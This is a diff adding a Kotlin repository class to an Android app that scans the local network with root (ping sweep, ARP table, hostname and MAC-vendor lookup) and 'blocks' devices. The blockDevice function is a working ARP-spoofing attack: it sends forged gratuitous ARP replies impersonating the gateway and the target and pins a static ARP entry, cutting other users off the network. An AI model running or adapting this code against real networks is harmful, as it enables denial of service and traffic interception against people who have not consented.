@@ -1,0 +1,343 @@
+package com.vishal.harpy.features.network_monitor.data.repository.impl
+
+import com.vishal.harpy.features.network_monitor.data.repository.NetworkMonitorRepository
+import com.vishal.harpy.core.utils.NetworkDevice
+import com.vishal.harpy.core.utils.NetworkTopology
+import android.util.Log
+import java.io.BufferedReader
+import java.io.DataOutputStream
+import java.io.IOException
+import java.io.InputStreamReader
+import kotlin.text.Regex
+
+class NetworkMonitorRepositoryImpl : NetworkMonitorRepository {
+    
+    companion object {
+        private const val TAG = "NetworkMonitorRepoImpl"
+    }
+    
+    override suspend fun scanNetwork(): List<NetworkDevice> {
+        val devices = mutableListOf<NetworkDevice>()
+        
+        Log.d(TAG, "Scanning network for connected devices...")
+        
+        if (isDeviceRooted()) {
+            devices.addAll(scanNetworkWithRoot())
+        } else {
+            Log.w(TAG, "Device is not rooted. Limited functionality available.")
+        }
+        
+        return devices
+    }
+    
+    override suspend fun isDeviceRooted(): Boolean {
+        return try {
+            val process = Runtime.getRuntime().exec("su")
+            val outputStream = process.outputStream
+            val inputStream = process.inputStream
+            
+            outputStream.write("id\n".toByteArray())
+            outputStream.flush()
+            outputStream.close()
+            
+            val reader = BufferedReader(InputStreamReader(inputStream))
+            val response = reader.readLine()
+            reader.close()
+            inputStream.close()
+            
+            process.waitFor()
+            process.destroy()
+            
+            response != null && response.contains("uid=0")
+        } catch (e: IOException) {
+            Log.d(TAG, "Device is not rooted: ${e.message}")
+            false
+        } catch (e: InterruptedException) {
+            Log.d(TAG, "Root check interrupted: ${e.message}")
+            false
+        }
+    }
+    
+    private fun scanNetworkWithRoot(): List<NetworkDevice> {
+        val devices = mutableListOf<NetworkDevice>()
+        
+        try {
+            val ipProcess = Runtime.getRuntime().exec("su -c \"ip route | grep -E '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' | head -n 1\"")
+            val ipReader = BufferedReader(InputStreamReader(ipProcess.inputStream))
+            val routeLine = ipReader.readLine()
+            ipReader.close()
+            ipProcess.waitFor()
+            
+            if (routeLine != null) {
+                val subnetPattern = Regex("""([0-9]+\.[0-9]+\.[0-9]+)\.0""")
+                val matchResult = subnetPattern.find(routeLine)
+                
+                if (matchResult != null) {
+                    val subnet = matchResult.groupValues[1]
+                    
+                    for (i in 1..254) {
+                        val pingProcess = Runtime.getRuntime().exec("su -c \"ping -c 1 -W 1 ${subnet}.${i}\"")
+                        pingProcess.waitFor()
+                    }
+                    
+                    val arpProcess = Runtime.getRuntime().exec("su -c \"cat /proc/net/arp\"")
+                    val arpReader = BufferedReader(InputStreamReader(arpProcess.inputStream))
+                    
+                    var line: String?
+                    while (arpReader.readLine().also { line = it } != null) {
+                        val fields = line?.split("\\s+".toRegex())
+                        if (fields != null && fields.size >= 6) {
+                            val ip = fields[0]  // IP address
+                            val flags = fields[2]  // Flags
+                            val mac = fields[3]  // MAC address
+                            val deviceInterface = fields[5]  // Device name
+                            
+                            if (flags.contains("0x2") || flags.contains("0x6")) {
+                                if (mac != "00:00:00:00:00:00" && mac != "<incomplete>") {
+                                    var hostname: String? = null
+                                    try {
+                                        val hostnameProcess = Runtime.getRuntime().exec("su -c \"nslookup $ip\"")
+                                        val hostnameReader = BufferedReader(InputStreamReader(hostnameProcess.inputStream))
+                                        var hostnameLine: String?
+                                        while (hostnameReader.readLine().also { hostnameLine = it } != null) {
+                                            if (hostnameLine!!.contains("name = ")) {
+                                                val nameMatch = Regex("name = (.+)").find(hostnameLine!!)
+                                                if (nameMatch != null) {
+                                                    hostname = nameMatch.groupValues[1].trimEnd('.')
+                                                    break
+                                                }
+                                            }
+                                        }
+                                        hostnameReader.close()
+                                        hostnameProcess.waitFor()
+                                    } catch (e: Exception) {
+                                        Log.d(TAG, "Could not resolve hostname for $ip: ${e.message}")
+                                    }
+                                    
+                                    val hwTypeDescription = when(fields[1].lowercase()) {
+                                        "0x1" -> "Ethernet"
+                                        "0x19" -> "WiFi"
+                                        "0x420" -> "Bridge"
+                                        else -> "Unknown"
+                                    }
+                                    
+                                    val vendor = identifyVendor(mac)
+                                    val deviceType = identifyDeviceType(NetworkDevice(ip, mac, hostname, vendor, hwTypeDescription))
+                                    
+                                    val networkDevice = NetworkDevice(
+                                        ipAddress = ip,
+                                        macAddress = mac,
+                                        hostname = hostname,
+                                        vendor = vendor,
+                                        deviceType = deviceType,
+                                        hwType = hwTypeDescription,
+                                        mask = fields[4],
+                                        deviceInterface = deviceInterface
+                                    )
+                                    devices.add(networkDevice)
+                                }
+                            }
+                        }
+                    }
+                    
+                    arpReader.close()
+                    arpProcess.waitFor()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error scanning network: ${e.message}", e)
+        }
+        
+        return devices
+    }
+    
+    private fun identifyVendor(macAddress: String): String? {
+        val oui = macAddress.substring(0, 8).uppercase()
+        
+        return when (oui) {
+            "00:50:43" -> "Siemens"
+            "00:50:C2" -> "IEEE Registration Authority"
+            "00:60:2F" -> "Hewlett Packard"
+            "00:A0:C9" -> "Intel Corporation"
+            "00:E0:4C" -> "Realtek Semiconductor Corp."
+            "08:00:27" -> "Oracle VirtualBox"
+            "1C:69:7A" -> "AcSiP Technology Corp."
+            "24:4B:03" -> "Samsung Electronics Co., Ltd"
+            "28:C6:3F" -> "Apple, Inc."
+            "38:4F:F0" -> "Samsung Electronics Co., Ltd"
+            "40:B0:FA" -> "LG Electronics (Mobile Communications)"
+            "44:D9:E7" -> "Ubiquiti Networks Inc."
+            "5C:F9:DD" -> "Dell Inc."
+            "6C:EC:5A" -> "Hon Hai Precision Ind. Co.,Ltd."
+            "78:4F:43" -> "Apple, Inc."
+            "80:A5:89" -> "AzureWave Technology Inc."
+            "8C:1F:64" -> "Intel Corporate"
+            "9C:93:4E" -> "ASUSTek Computer, Inc."
+            "AC:DE:48" -> "Intel Corporate"
+            "B8:27:EB" -> "Raspberry Pi Foundation"
+            "BC:5F:F4" -> "Dell Inc."
+            "C8:60:00" -> "Apple, Inc."
+            "D8:3B:BF" -> "Samsung Electronics Co., Ltd"
+            "DC:A6:32" -> "Raspberry Pi Trading Ltd"
+            "E4:5D:52" -> "Intel Corporate"
+            "EC:26:CA" -> "TP-Link Technologies Co., Ltd."
+            "F0:18:98" -> "Apple, Inc."
+            "F4:8C:50" -> "Intel Corporate"
+            else -> null
+        }
+    }
+    
+    private fun identifyDeviceType(device: NetworkDevice): String? {
+        val vendor = device.vendor ?: identifyVendor(device.macAddress)
+        
+        return when {
+            vendor?.contains("Apple", ignoreCase = true) == true -> "Phone/Tablet"
+            vendor?.contains("Samsung", ignoreCase = true) == true -> "Phone/Tablet"
+            vendor?.contains("Intel", ignoreCase = true) == true -> "Computer"
+            vendor?.contains("Dell", ignoreCase = true) == true -> "Computer"
+            vendor?.contains("HP", ignoreCase = true) == true || 
+            vendor?.contains("Hewlett", ignoreCase = true) == true -> "Computer/Printer"
+            vendor?.contains("Raspberry", ignoreCase = true) == true -> "IoT/Single-board computer"
+            vendor?.contains("TP-Link", ignoreCase = true) == true ||
+            vendor?.contains("Ubiquiti", ignoreCase = true) == true ||
+            vendor?.contains("Realtek", ignoreCase = true) == true -> "Router/Network equipment"
+            device.hwType?.contains("WiFi", ignoreCase = true) == true -> "Wireless Device"
+            device.hwType?.contains("Ethernet", ignoreCase = true) == true -> "Wired Device"
+            else -> null
+        }
+    }
+    
+    override suspend fun blockDevice(device: NetworkDevice): Boolean {
+        if (!isDeviceRooted()) {
+            Log.e(TAG, "Cannot block device: Device is not rooted")
+            return false
+        }
+        
+        return try {
+            val gatewayIp = getGatewayIp()
+            if (gatewayIp.isNullOrEmpty()) {
+                Log.e(TAG, "Could not determine gateway IP for ARP spoofing")
+                return false
+            }
+            
+            val process = Runtime.getRuntime().exec("su")
+            val outputStream = DataOutputStream(process.outputStream)
+            
+            outputStream.writeBytes("arping -U -c 1 -s $gatewayIp ${device.ipAddress}\n")
+            outputStream.writeBytes("arping -U -c 1 -s ${device.ipAddress} $gatewayIp\n")
+            
+            val ourMac = getOurMacAddress()
+            if (!ourMac.isNullOrEmpty()) {
+                outputStream.writeBytes("arp -s ${device.ipAddress} $ourMac\n")
+            }
+            
+            outputStream.writeBytes("exit\n")
+            outputStream.flush()
+            
+            process.waitFor()
+            Log.i(TAG, "Successfully initiated ARP spoofing to block device: ${device.ipAddress}")
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "Error blocking device ${device.ipAddress}: ${e.message}", e)
+            false
+        }
+    }
+    
+    override suspend fun unblockDevice(device: NetworkDevice): Boolean {
+        if (!isDeviceRooted()) {
+            Log.e(TAG, "Cannot unblock device: Device is not rooted")
+            return false
+        }
+        
+        return try {
+            val process = Runtime.getRuntime().exec("su")
+            val outputStream = DataOutputStream(process.outputStream)
+            
+            outputStream.writeBytes("arp -d ${device.ipAddress}\n")
+            outputStream.writeBytes("ping -c 1 -W 1 ${device.ipAddress}\n")
+            outputStream.writeBytes("exit\n")
+            outputStream.flush()
+            
+            process.waitFor()
+            Log.i(TAG, "Successfully unblocked device: ${device.ipAddress}")
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unblocking device ${device.ipAddress}: ${e.message}", e)
+            false
+        }
+    }
+    
+    override suspend fun mapNetworkTopology(): NetworkTopology {
+        val devices = scanNetwork()
+        val gatewayIp = getGatewayIp()
+        
+        val gatewayDevice = devices.find { it.ipAddress == gatewayIp }
+        
+        val devicesByType = mutableMapOf<String, MutableList<NetworkDevice>>()
+        val unknownDevices = mutableListOf<NetworkDevice>()
+        
+        devices.forEach { device ->
+            if (device.deviceType != null) {
+                if (!devicesByType.containsKey(device.deviceType)) {
+                    devicesByType[device.deviceType] = mutableListOf()
+                }
+                devicesByType[device.deviceType]?.add(device)
+            } else {
+                unknownDevices.add(device)
+            }
+        }
+        
+        return NetworkTopology(
+            gatewayDevice,
+            devices,
+            devicesByType,
+            unknownDevices
+        )
+    }
+    
+    private fun getGatewayIp(): String? {
+        return try {
+            val process = Runtime.getRuntime().exec("su -c \"ip route | grep default | awk '{print \$3}'\"")
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val gatewayIp = reader.readLine()
+            reader.close()
+            process.waitFor()
+            
+            gatewayIp?.trim()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting gateway IP: ${e.message}", e)
+            null
+        }
+    }
+    
+    private fun getOurMacAddress(): String? {
+        return try {
+            val process = Runtime.getRuntime().exec("su -c \"cat /sys/class/net/wlan0/address\"")
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val macAddress = reader.readLine()
+            reader.close()
+            process.waitFor()
+            
+            if (!macAddress.isNullOrEmpty() && macAddress != "00:00:00:00:00:00") {
+                macAddress.trim()
+            } else {
+                val interfaces = arrayOf("wlan0", "wlan1", "eth0", "rndis0")
+                for (iface in interfaces) {
+                    val altProcess = Runtime.getRuntime().exec("su -c \"cat /sys/class/net/$iface/address\"")
+                    val altReader = BufferedReader(InputStreamReader(altProcess.inputStream))
+                    val altMac = altReader.readLine()
+                    altReader.close()
+                    altProcess.waitFor()
+                    
+                    if (!altMac.isNullOrEmpty() && altMac != "00:00:00:00:00:00") {
+                        return altMac.trim()
+                    }
+                }
+                null
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting MAC address: ${e.message}", e)
+            null
+        }
+    }
+}
